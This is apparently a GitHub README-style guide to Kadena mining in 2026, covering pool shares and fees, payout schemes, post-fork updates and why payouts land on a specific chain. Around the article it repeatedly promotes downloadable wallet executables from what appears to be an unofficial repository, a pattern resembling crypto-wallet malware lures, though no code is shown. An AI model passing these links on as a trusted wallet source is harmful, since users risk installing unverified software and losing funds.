![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Kadena Mining in 2026: Pools, Payouts and Where They Land</h1>

<p align="center">A Kadena Wallet guide to the network and the market.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

Kadena is still mined with hardware, still pays block rewards to whoever finds a block, and still runs on the same proof-of-work design it always did. What changed is everything around the rigs: the company that ran the chain is gone, pool concentration has shifted, and the software has to be updated before a machine that was switched off in 2024 will produce anything useful.

For a wallet holder, the part that matters most is the last step of mining: where the payout lands, and whether the wallet can see it there.

## You'll see this if

- You have an ASIC idle since the shutdown and want to know whether it still works.
- You are choosing a pool and every comparison you find predates November 2025.
- Your miner reports shares but your wallet shows no balance.
- You are mining to an address and are not sure which chain it pays into.

## Is mining still possible

Yes. The chain remained proof-of-work through the community takeover, and the network still produces blocks on all twenty chains. Third-party measurement in November 2026 put total hashrate around 16.8 PH/s, which is a fraction of the network's peak and is the single most important number for anyone doing arithmetic.

A lower hashrate means the same machine earns a larger share of a smaller total. It does not automatically mean profit, because the token's price fell at the same time and the two effects pull in opposite directions. Any decision needs both numbers, checked on the day.

## The pool landscape

Concentration matters as much as fees. The current split, as reported in November 2026:

| Pool | Approximate share | Payment scheme | Fee and minimum |
| --- | --- | --- | --- |
| AntPool | Around 48% | PPS | 3%, minimum 2 KDA |
| OberPool | Around 34-36% | PPLNS | 0%, minimum 50 KDA |
| Poolflare | Around 15-17% | Not stated in the source | 2% |
| Kadena Garden | Around 1% | Solo | Not stated in the source |

Two things stand out. One pool controls nearly half the hashrate, which is a centralisation fact worth knowing even if it does not change your income. And a solo pool exists at the other end, where the variance is extreme and the fee structure is different in kind rather than degree.

PPS pays per share submitted, so income is steadier and the pool carries the luck. PPLNS pays when the pool finds blocks, so income tracks pool luck and rewards loyalty. The minimum payout is often the practical deciding factor for a small rig: a 50 KDA floor can take a long time to reach.

## What changed after the fork

Three practical differences affect a machine that was idle.

- **Software updates are required.** Node and miner configurations changed with the community releases, and the announcement channels distribute the current settings. A rig running pre-2025 firmware will not earn.
- **Hardware compatibility held.** The KA3 generation still works with updated software, which was the common question in late 2025 and the answer has not changed.
- **Governance now involves miners.** Version 3.1 introduced miner voting, so the act of mining is also participation in how the chain upgrades. That is a reason to follow release notes rather than only pool statistics.

## Where payouts land

This is the part that turns a mining problem into a wallet problem, and it is where most "my miner works but I have nothing" reports come from.

A payout is a transfer to an account on a specific chain. Three details decide whether you can see it.

**The chain.** Pools pay on a chain they choose, and a wallet displays one chain at a time. If the payout goes to chain 2 and the wallet opens on chain 0, the balance is invisible rather than absent.

**The name form.** Pools usually accept a `k:` principal. Some older configurations accepted a bare public key, which is a legacy account and a separate name from the prefixed one. Mining to the wrong form is a common historical cause of funds that appear missing.

**The account's existence.** A payout to a name that has never been used on that chain requires the pool to create it, which some pools handle and others reject. If a payout fails silently, this is a candidate.

Before pointing a rig anywhere, confirm with the pool which chain it pays on, and set your wallet to that chain. Then send one payout's worth of shares and verify the credit on an explorer before scaling up.

## Choosing a pool

Four criteria, in order of how much they affect the outcome.

1. **Can it pay you at all?** Check that your address form is accepted and that a test payout arrives.
2. **What is the minimum?** A high floor on a small rig is a delay, not a fee.
3. **What is the scheme?** PPS for predictability, PPLNS for pool-luck exposure.
4. **How concentrated is it?** A pool approaching half the network is a risk to the network, and your income is collateral.

Fee percentage is fifth on that list, which is not the order most comparisons use.

## Mining solo

Solo mining means finding blocks yourself and keeping the whole reward. With network hashrate near 16.8 PH/s, a single machine's chance of finding a block is small, and the expected value is similar to pool mining with far more variance.

Solo pools change the shape rather than the odds: you contribute to a pool that only pays when it finds a block, so the payout is large and rare. That is a reasonable choice for someone who prefers a lottery to a trickle, and a poor one for anyone relying on the income.

## The arithmetic you should do yourself

Three inputs decide whether mining is worth running: the machine's power draw in kilowatts, the electricity price per kilowatt-hour, and the expected KDA per day at current difficulty. Multiply the first two by 24 to get a daily cost, price the third at whatever rate you are prepared to accept, and compare.

Two cautions about that arithmetic. Difficulty and price both move, so a calculation from last month is not evidence about this one. And hashrate is measured by third parties, which means it is an estimate rather than a protocol output.

## FAQ

**Do I need the community node software to mine?**
You need current miner configuration for the network as it runs today. The announcement channels publish it, and pre-2025 settings are the usual reason a rig earns nothing.

**Will my KA3 still work?**
Yes, with updated software. The hardware generation was not obsoleted by the fork.

**Why does my pool dashboard show a balance my wallet does not?**
Almost always the chain. Ask the pool which chain it pays on and set the wallet to match.

**Is mining to a bare public key a problem?**
It is a legacy account, which is valid but distinct from the `k:` name for the same key. If the pool accepts it, the funds are real and visible once you open that account.

**Is mining profitable in 2026?**
That depends on your electricity cost, your hardware and the current price, and those are three moving numbers. Anyone quoting a figure without them is guessing.

## Related reading

- Community Edition of Kadena, explained
- Choosing a chain in Kadena Wallet: why balances differ
- Legacy accounts and k: addresses: why both still exist
- What happened to Kadena: the fourteen months that changed everything

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [KDA and KDX Are Not the Same Token: What Each One Is](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/kadena-vs-kdx-token-difference.md)
- [KDX Staking After the Shutdown: What Still Works](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/kdx-staking-after-kadena-shutdown.md)
- [Bridges to and from Kadena: What Exists and What It Costs You](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/kadena-bridge-options-and-risk.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
